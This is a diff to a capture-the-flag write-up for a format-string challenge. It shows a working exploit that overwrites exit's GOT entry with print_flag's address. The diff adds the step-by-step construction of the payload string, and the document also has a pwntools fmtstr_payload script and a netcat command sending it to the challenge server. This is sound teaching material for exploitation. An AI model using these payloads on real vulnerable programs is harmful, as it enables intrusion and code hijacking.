@@ -67,36 +67,65 @@ The Global Offset Table looks like:
 .got.plt:0804A020 78 A0 04 08 off_804A020 dd offset __libc_start_main
 ```
 
-Later in the program after `printf` returns `exit` is called.   
+Later in the program after `printf` returns `exit` is called.  
 If we modify the address of `exit` in the GOT with that of `print_flag`, it would be executed and we would get our flag.
 
-The entry of `exit` in the GOT is at `0804A01C` and it contains the bytes `74 A0 04 08`.    
-The address of `print_flag` in little endian byte order is `AB 85 04 08`.   
+The entry of `exit` in the GOT is at `0804A01C` and it contains the bytes `74 A0 04 08`.  
+The address of `print_flag` in little endian byte order is `AB 85 04 08`.  
 Hence we would only need to write the two bytes `AB 85` , as the remaining two are already properly set up.
 
-Summarizing, 
+Summarizing,
 
-Write`0xAB`  \(171\) to `0804A01C`  
+Write`0xAB`  \(171\) to `0804A01C`
+
 Write `0x85` \(133\) to `0804A01D`
 
-Since 133 &lt; 171, we can write 133 at `0804A01D` followed by 171 at `0804A01C`.   
-\(The reverse is also possible where we have to use wrap around\)
+Since 133 &lt; 171, we can write 133 at `0804A01D` followed by 171 at `0804A01C`.  
+\(The reverse is also possible where we have to use wrap around. More on this next\).
+
+#### Building the exploit string
+
+Our exploit string will start with the two addresses in little endian byte order.
 
 ```
-	-------------8 bytes------------
-	|               |              |
-	|  1st address  | 2nd address  |
-	|               |              |
-	\x1d\xa0\x04\x08\x1c\xa0\x04\x08
+    -------------8 bytes------------
+    |               |              |
+    |  1st address  | 2nd address  |
+    |               |              |
+    \x1d\xa0\x04\x08\x1c\xa0\x04\x08
 ```
 
+This takes up 8 bytes.
 
+The string is located at an offset of 12 bytes \(3 dwords\) from the pointer to itself \(See above\).  
+To reach the start of the string on the stack we need to consume these 3 dwords.  
+The format string that can be used is` %08x%08x%08x`
+
+The exploit string generated till this point is 
+
+```
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%08x
+```
+
+When this is passed to `printf`, the number of bytes it will display = 4 + 4 + 8 + 8 + 8 = 24
+
+To reach 133, we still need to print `133 - 24 = 109` more bytes. We can append this 109 bytes to get:
+
+```
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%08xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+Alternatively, we can make the last `%08x` to display 109 bytes using space padding:
+
+```
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%08x%08x%109x
+```
 
 
 
 ## Using pwntools \(automated\)
 
-**Generate the exploit**
+#### Generate the exploit
 
 First parameter \(4\) indicates that the string is the 4th parameter.  
 See the [pwntools docs](http://python3-pwntools.readthedocs.io/en/latest/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) for more info.
@@ -106,7 +135,7 @@ from pwnlib.fmtstr import fmtstr_payload
 open('exploit', 'w').write(fmtstr_payload(4, {0x0804a01c: 0x080485ab}, write_size='byte'))
 ```
 
-**Profit :\)**
+#### Profit :\)
 
 ```bash
 $ nc pwn.ctf.tamu.edu 4323 < exploit
